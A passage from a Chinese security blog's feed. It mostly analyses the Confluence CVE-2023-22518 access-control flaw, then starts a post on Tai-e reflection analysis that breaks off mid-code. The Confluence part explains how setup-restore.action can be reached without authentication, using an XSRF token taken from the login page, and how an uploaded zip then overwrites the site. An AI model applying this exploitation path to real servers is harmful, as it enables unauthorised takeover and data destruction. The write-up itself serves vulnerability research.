class="keyword">return</span> var7;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var7 = <span class="string">&quot;notpermitted&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> var7;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">var11</span> <span class="operator">=</span> actionInvocation.invoke();</span><br><span class="line">        <span class="keyword">return</span> var11;</span><br></pre></td></tr></table></figure><ol><li>ContainerManager.isContainerSetup() 判断是否安装</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isReadOnlyAccessAllowed</span><span class="params">(ActionInvocation actionInvocation, Package actionClassPackage, Class&lt;? extends Action&gt; actionClass)</span> &#123;</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="built_in">this</span>.getMethod(actionInvocation, actionClass);</span><br><span class="line">    <span class="keyword">return</span> StringUtils.startsWith(actionInvocation.getProxy().getNamespace(), <span class="string">&quot;/admin&quot;</span>) || <span class="built_in">this</span>.isAnnotated(actionClassPackage, <span class="string">&quot;ReadOnlyAccessAllowed&quot;</span>) || <span class="built_in">this</span>.isAnnotated(actionClass, <span class="string">&quot;ReadOnlyAccessAllowed&quot;</span>) || <span class="built_in">this</span>.isAnnotated(method, <span class="string">&quot;ReadOnlyAccessAllowed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>功能：</p><ol><li>如果namespace 以/admin开始</li><li>或者class / package/ method 有ReadOnlyAccessAllowed 注解，那么返回true<blockquote><p>这里存在问题</p></blockquote></li></ol><p>isPermitted</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPermitted</span><span class="params">()</span> &#123;</span><br><span class="line"> <span class="comment">// 如果没有安装完成，那么直接返回true</span></span><br><span class="line">     <span class="keyword">if</span> (!<span class="built_in">this</span>.getBootstrapManager().isSetupComplete()) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="comment">// 否则，查看当前用户是否有访问 USECONFLUENCE的权限</span></span><br><span class="line">         <span class="keyword">if</span> (!<span class="built_in">this</span>.skipAccessCheck &amp;&amp; !<span class="built_in">this</span>.spacePermissionManager.hasPermission(<span class="string">&quot;USECONFLUENCE&quot;</span>, (Space)<span class="literal">null</span>, <span class="built_in">this</span>.getAuthenticatedUser())) &#123;</span><br><span class="line">             <span class="built_in">this</span>.eventManager.publishEvent(<span class="keyword">new</span> <span class="title class_">NoConfluencePermissionEvent</span>(<span class="built_in">this</span>));</span><br><span class="line">         &#125;</span><br><span class="line"><span class="comment">// 返回当前用户是否有所有space 的权限</span></span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">this</span>.spacePermissionManager.hasAllPermissions(<span class="built_in">this</span>.getPermissionTypes(), (Space)<span class="literal">null</span>, <span class="built_in">this</span>.getAuthenticatedUser());</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><ul><li>个人理解：除开admin，这里都会false，未验证</li><li>实际测试：未登陆用户isPermitted 也为true ？？所以未登录客户可以直接bypass这个规则。</li></ul><blockquote><p>重要：</p></blockquote><h4 id="3-2-4-UserAwareInterceptor"><a href="#3-2-4-UserAwareInterceptor" class="headerlink" title="3.2.4 UserAwareInterceptor"></a>3.2.4 UserAwareInterceptor</h4><p>总结：</p><blockquote><p>UserAwareInterceptor 是鉴定和用户相关操作的</p></blockquote><p>具体逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation actionInvocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Ticker</span> <span class="variable">ignored</span> <span class="operator">=</span> Timers.start(<span class="string">&quot;UserAwareInterceptor.intercept()&quot;</span>);</span><br><span class="line">    <span class="type">Throwable</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Action</span> <span class="variable">action</span> <span class="operator">=</span> actionInvocation.getAction();</span><br><span class="line">        <span class="comment">// 用户相关操作</span></span><br><span class="line">        <span class="keyword">if</span> (action <span class="keyword">instanceof</span> UserAware) &#123;</span><br><span class="line">            <span class="type">UserAware</span> <span class="variable">userAware</span> <span class="operator">=</span> (UserAware)action;</span><br><span class="line">            <span class="comment">// 目标用户，比如feed某人</span></span><br><span class="line">            <span class="type">User</span> <span class="variable">targetUser</span> <span class="operator">=</span> userAware.getUser();</span><br><span class="line">            <span class="comment">// action需要查看用户的权限</span></span><br><span class="line">            <span class="keyword">if</span> (userAware.isViewPermissionRequired()) &#123;</span><br><span class="line">            <span class="comment">// 当前用户</span></span><br><span class="line">                <span class="type">ConfluenceUser</span> <span class="variable">loggedInUser</span> <span class="operator">=</span> AuthenticatedUserThreadLocal.get();</span><br><span class="line">                <span class="comment">// 判断当前用户可以查看目标用户</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.canBrowseUsers(loggedInUser)) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="string">&quot;notpermitted&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> var8;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">// 如果action需要目标用户，但是目标用户不存在</span></span><br><span class="line">            <span class="keyword">if</span> (userAware.isUserRequired() &amp;&amp; targetUser == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">var21</span> <span class="operator">=</span> <span class="string">&quot;notfound&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> var21;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-5-SetupCheckInterceptor"><a href="#3-2-5-SetupCheckInterceptor" class="headerlink" title="3.2.5 SetupCheckInterceptor"></a>3.2.5 SetupCheckInterceptor</h4><p>前文中，判断是否已经安装有通过</p><ul><li>ContainerManager.isContainerSetup()</li><li>this.getBootstrapManager().isSetupComplete()</li></ul><p>在SetupCheckInterceptor 中，同时检验了这两处。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation actionInvocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">return</span> BootstrapUtils.getBootstrapManager().isSetupComplete() &amp;&amp; ContainerManager.isContainerSetup() ? <span class="string">&quot;alreadysetup&quot;</span> : actionInvocation.invoke();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-2-6-SetupIncompleteInterceptor"><a href="#3-2-6-SetupIncompleteInterceptor" class="headerlink" title="3.2.6 SetupIncompleteInterceptor"></a>3.2.6 SetupIncompleteInterceptor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">intercept</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ServletActionContext.getRequest();</span><br><span class="line">    <span class="keyword">if</span> (request != <span class="literal">null</span> &amp;&amp; !StringUtils.isBlank(request.getServletPath()) &amp;&amp; !<span class="built_in">this</span>.shouldPassThrough(request.getServletPath())) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.isSetupComplete()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">servletPath</span> <span class="operator">=</span> request.getServletPath();</span><br><span class="line">            <span class="keyword">if</span> (!silentRedirects.contains(servletPath)) &#123;</span><br><span class="line">                log.warn(<span class="string">&quot;Redirecting request to current setup step: &#123;&#125;&quot;</span>, HtmlUtil.htmlEncode(servletPath));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;notsetup&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> invocation.invoke();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isSetupComplete</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ContainerManager.isContainerSetup() &amp;&amp; ((BootstrapManager)<span class="built_in">this</span>.bootstrapManagerSupplier.get()).isSetupComplete();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑同上，不过是检测没安装完成，如果没安装完成，就返回notsetup，进入安装。</p><h3 id="3-3-区别"><a href="#3-3-区别" class="headerlink" title="3.3 区别"></a>3.3 区别</h3><table><thead><tr><th>interceptor</th><th>doenterpagevariables</th><th>createpage</th></tr></thead><tbody><tr><td>ConfluenceAccessInterceptor</td><td>Y</td><td>Y</td></tr><tr><td>PageAwareInterceptor</td><td>Y</td><td>pagenotpermitted</td></tr></tbody></table><p><img src="/images/pasted-824.png" alt="upload successful"></p><p>注意这里的<code>pageAware instanceof CreatePageEntryAction</code> 导致进入了PAGE_NOT_PERMITTED 逻辑。<br>在doenterpagevariables中，直接进入到最下面的PageAwareHelper.Result.OK。</p><blockquote><p>疑问：可能是健壮性设计要求？这个像个白名单逻辑，很容易出问题。</p></blockquote><h3 id="3-4-isPermitted"><a href="#3-4-isPermitted" class="headerlink" title="3.4 isPermitted"></a>3.4 isPermitted</h3><p>isPermitted 在最基础的ConfluenceActionSupport 类中出现，其他的子类中，也有对这一方法的重写。</p><p>如果还记得PermissionCheckInterceptor，中间有这么一段逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!confluenceAction.isPermitted()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    var7 = <span class="string">&quot;notpermitted&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> var7;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">var11</span> <span class="operator">=</span> actionInvocation.invoke();</span><br><span class="line"><span class="keyword">return</span> var11;</span><br></pre></td></tr></table></figure><p>这里才是整个action权限验证的关键：重写isPermitted 实现权限约束。</p><h4 id="3-4-1-admin权限"><a href="#3-4-1-admin权限" class="headerlink" title="3.4.1 admin权限"></a>3.4.1 admin权限</h4><p>看看admin 相关action是如何通过isPermitted 实现权限约束的。</p><p>举个例子：ConfigureLog4jAction，管理员配置日志功能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPermitted</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.permissionManager.hasPermission(<span class="built_in">this</span>.getAuthenticatedUser(), Permission.ADMINISTER, PermissionManager.TARGET_SYSTEM);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-漏洞挖掘"><a href="#0x04-漏洞挖掘" class="headerlink" title="0x04 漏洞挖掘"></a>0x04 漏洞挖掘</h2><p>从漏洞关键点出发：</p><p>利用namespace 继承父namespace 的actions，但是default interceptor 用的却不是父namespace的，会造成interceptors的不一致</p><h3 id="4-1-Actions-with-default-Interceptor"><a href="#4-1-Actions-with-default-Interceptor" class="headerlink" title="4.1 Actions with default Interceptor"></a>4.1 Actions with default Interceptor</h3><p>思路如下：</p><p>setup namespace 默认setupStack，有SetupCheckInterceptor</p><p>admin/json namespace 默认validatingStack，没有setupStack</p><p>看看有哪些setup namespace 中没有SetupCheckInterceptor 的action。</p><p>筛选下来，有以下action：</p><ul><li>getbundles</li><li>dosetuplicense</li><li>setupcluster</li><li>setupdatasourcedb</li><li>setupadministrator</li><li>setup-restore</li><li>setup-restore-local</li><li>finishsetup</li><li>finishclustersetup</li></ul><p>试试/json/getbundles.action，发现过不了，原因为：</p><p>GetBundlesAction extends AbstractSetupAction，其isPermitted 接口如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPermitted</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> !GeneralUtil.isSetupComplete();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>剩下几个类似，也都是AbstractSetupAction子类，也没有重写isPermitted</p><h3 id="4-2-setup-restore-amp-setup-restore-local-未授权访问"><a href="#4-2-setup-restore-amp-setup-restore-local-未授权访问" class="headerlink" title="4.2 setup-restore &amp; setup-restore-local 未授权访问"></a>4.2 setup-restore &amp; setup-restore-local 未授权访问</h3><p>直到setup-restore，重写了isPermitted，always true，导致可以为授权访问。</p><p>SetupRestoreAction</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPermitted</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是发现过不了XsrfTokenInterceptor 的alt_token</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">validateToken</span><span class="params">(HttpServletRequest request, String token)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> token != <span class="literal">null</span> &amp;&amp; token.equals(request.getSession(<span class="literal">true</span>).getAttribute(<span class="string">&quot;atlassian.xsrf.token&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SSRF Token，在实现上，Confluence 并没有一个From &amp; Session 一个Token，而是一个Session 一个Token，所以可以找到其他的未授权的From 表单，找到对应的atl_token</p><p>找到了login.action 登陆接口。</p><p>至此实现了未授权访问</p><h3 id="4-3-setup-restore-网站备份恢复"><a href="#4-3-setup-restore-网站备份恢复" class="headerlink" title="4.3 setup-restore 网站备份恢复"></a>4.3 setup-restore 网站备份恢复</h3><p>恰巧的是setup-restore.action 是网站备份恢复接口，post 个zip 过去可以直接覆盖网站。</p><p>所以这是个“坐牢洞”，会严重影响系统数据，不可以在线上尝试。</p><p>搭配参考文章2中的Confluence 后台RCE，应该可以实现漏洞公告的效果，这里未实际验证，暂不深究了。</p><h2 id="0x05-总结与思考"><a href="#0x05-总结与思考" class="headerlink" title="0x05 总结与思考"></a>0x05 总结与思考</h2><ol><li>这是Struts xwrok.xml 配置实现中存在的通用问题：子namespace 会继承父namespace 的actions，但是却不会继承其default interceptors</li><li>算是个逻辑漏洞，作者很细心，也一定是对Struts很了解，由一点小bug引发的RCE</li></ol><p>如何才能发现该漏洞：</p><ol><li>深入分析struts 原理，了解namespace 和action、interceptor 机制才能发现</li><li>自动化不能解决此类问题</li></ol><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ol><li><a href="https://mp.weixin.qq.com/s/hjCEUJElc8I2H-gtv4gM7w">https://mp.weixin.qq.com/s/hjCEUJElc8I2H-gtv4gM7w</a></li><li><a href="https://mp.weixin.qq.com/s/TI4_fmt55IH62u5xkAuk_A">https://mp.weixin.qq.com/s/TI4_fmt55IH62u5xkAuk_A</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-漏洞时间线&quot;&gt;&lt;a href=&quot;#0x01-漏洞时间线&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞时间线&quot;&gt;&lt;/a&gt;0x01 漏洞时间线&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;10月16日 长亭安全研究员发现该漏洞&lt;/li&gt;
&lt;li&gt;10月31日 官方发布新版本修复漏洞&lt;/li&gt;
&lt;li&gt;10月31日 17:59 长亭安全应急响应中心发布通告&lt;/li&gt;
&lt;li&gt;10月31日 18:50 beichen 已经复现&lt;br&gt;  &lt;img src=&quot;/images/pasted-813.png&quot; alt=&quot;upload successful&quot;&gt;&lt;br&gt;  &lt;img src=&quot;/images/pasted-814.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/li&gt;
&lt;li&gt;10月31日 threedream师傅疑问，beichen确认  &lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;假设存在URL为/barspace/bar.action的请求，而且/barspace的命名空间下没有名为bar的Action，则默认命名空间下名为bar的Action也会处理用户请求。但根命名空间下的Action仅仅处理根命名空间下的Action的请求，这是根命名空间和默认命名空间的差别。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   命名空间仅仅有一个级别。假设请求的URL是/bookservice/search/get.action。系统将先在/bookservice/search的命名空间下查找名为get的Action，假设在该命名空间内找到名为get的Action。则由该Action处理用户的请求。假设未找到。系统将直接进入默认的命名空间中查找名为get的Action，而不会在/bookservice的命名空间下查找名为get的Action 。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Confluence" scheme="http://m0d9.me/tags/Confluence/"/>
    
    <category term="CVE-2023-22518" scheme="http://m0d9.me/tags/CVE-2023-22518/"/>
    
  </entry>
  
  <entry>
    <title>Tai-e 指针分析之反射算法Solar分析</title>
    <link href="http://m0d9.me/2023/10/09/Tai-e-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E4%B9%8B%E5%8F%8D%E5%B0%84%E7%AE%97%E6%B3%95Solar%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2023/10/09/Tai-e-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E4%B9%8B%E5%8F%8D%E5%B0%84%E7%AE%97%E6%B3%95Solar%E5%88%86%E6%9E%90/</id>
    <published>2023-10-09T08:57:00.000Z</published>
    <updated>2025-06-11T11:49:36.536Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h1><p>如谭老师参考【4】中的《Java指针分析综述》一文中对于Java反射的静态分析研究简述：</p><ol><li>Livshits 借助指针分析解析反射关键API的字符串参数进而分析出反射调用的副作用，简称字符串分析方法。</li><li>谭、李老师提出的Elf 方案，思路大致是不依赖调用参数必须是字符串常量，而是根据其他信息，比如反射调用的参数类型、返回值的向下类型转换等。</li><li>还是谭、李老师推出的Solar 方案，不是很懂，原文复述下<ul><li>集体推导技术(collective inference)</li><li>懒惰堆建模(lazy heap modeling)， 懒惰堆建模用于分析由反射调用Class.newInstance()或 Constructor.newInstance()创建但具体类型在创建点未知的堆对象。对于这类对象，Solar 将其传播到程序中使用它们的位置，如向下类型转换，或Method.invoke()、Field.get()、Field.set()的反射调用点等，并更充分地利用程序中这些位置的类型信息以分析反射创建对象的具体类型。</li></ul></li></ol><h1 id="0x02-Tai-e-Solar"><a href="#0x02-Tai-e-Solar" class="headerlink" title="0x02 Tai-e Solar"></a>0x02 Tai-e Solar</h1><h2 id="2-1-Invoke-Demo-Code"><a href="#2-1-Invoke-Demo-Code" class="headerlink" title="2.1 Invoke Demo Code"></a>2.1 Invoke Demo Code</h2><p>先准备待测试程序InvokeDemo</p><span id="more"></span><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokeDemo</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    InvokeDemo(String name)&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">echoName</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;echo by echoName: &quot;</span> + <span class="built_in">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">echo</span><span class="params">(String content)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;echo by echo: &quot;</span> + content);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> args[<span class="number">0</span>];</span><br><span class="line">        <span class="type">String</span> <span class="variable">methodNmae</span> <span class="operator">=</span> args[<span class="number">1</span>];</span><br><span class="line">        <span class="type">InvokeDemo</span> <span class="variable">tt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokeDemo</span>(content);</span><br><span class="line">        <span class="comment">// 1. 测试污点为参数</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> tt.getClass().getMethod(<span class="string">&quot;echo&quot;</span>, String.class);</span><br><span class="line">        method.invoke(tt, content);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 测试污点为method</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> tt.getClass().getMethod(methodNmae);</span><br><span class="line">        method2.invoke(tt);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 测试类型</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tt3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokeDemo</span>(content);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method3</span> <span class="operator">=</span> tt3.getClass().getMethod(<span class="string">&quot;echo&quot;</span>, String.class);</span><br><span class="line">        method3.invoke(tt3, content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要指定pta模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-<span class="built_in">cp</span> /Users/m0d9/study/codeql-home/custom/test/query-tests/invoke/ </span><br><span class="line">-pp </span><br><span class="line">--main-class InvokeDemo </span><br><span class="line">-ap </span><br><span class="line">-a pta=taint-config:src/test/resources/pta/taint/taint-config.yml</span><br></pre></td></tr></table></figure><h2 id="2-2-测试"><a href="#2-2-测试" class="headerlink" title="2.2 测试"></a>2.2 测试</h2><p><img src="/images/pasted-793.png" alt="upload successful"><br>可以看到，识别的两个Invoke调用结果都正确：</p><ol><li>第一个invoke识别为echo</li><li>第二个是不确定的，可以是InvokeDemo任意不带参数的方法</li></ol><h1 id="0x03-PTA前置知识"><a href="#0x03-PTA前置知识" class="headerlink" title="0x03 PTA前置知识"></a>0x03 PTA前置知识</h1><p>在前文指针分析中，简单提到过反射分析、污点分析都是由Tai-e PTA的plugin机制实现的。下面来看看具体的实现</p><h2 id="3-1-Plugin机制"><a href="#3-1-Plugin机制" class="headerlink" title="3.1 Plugin机制"></a>3.1 Plugin机制</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PointerAnalysis#analyze</span><br><span class="line">runAnalysis</span><br><span class="line">    setPlugin</span><br><span class="line">            CompositePlugin#addPlugin</span><br><span class="line">            CompositePlugin#setSolver</span><br><span class="line">            DefaultSolver#setPlugin</span><br></pre></td></tr></table></figure><p>在这一过程中会加载插件</p><p><img src="/images/pasted-708.png" alt="upload successful"></p><h3 id="3-1-1-插件接口"><a href="#3-1-1-插件接口" class="headerlink" title="3.1.1 插件接口"></a>3.1.1 插件接口</h3><p>并且根据plugin实现接口，归类</p><ul><li>onNewPointsToSet</li><li>onNewCallEdge</li><li>onNewMethod<ul><li>ClassInitializer</li></ul></li><li>onNewStmt</li><li>onNewCSMethod</li><li>onUnresolvedCall</li></ul><h4 id="Invoke-Plugin-API"><a href="#Invoke-Plugin-API" class="headerlink" title="Invoke Plugin API"></a>Invoke Plugin API</h4><p>何时调用的Plugin 接口？答案是在DefaultSolver中</p><ol><li>initialize 接口中调用plugin.onStart</li><li>anaylze接口中调用onNewPointsToSet 和onFinish</li><li>addCSMethod 接口中调用plugin.onNewCSMethod</li><li>processNewMethod 接口中调用plugin.onNewMethod 和onNewStmt</li><li>processCall 接口中调用plugin.onUnresolvedCall</li><li>processCallEdge 接口中调用plugin.onNewCallEdge</li></ol><h3 id="3-1-2-Load-Plugins"><a href="#3-1-2-Load-Plugins" class="headerlink" title="3.1.2 Load Plugins"></a>3.1.2 Load Plugins</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 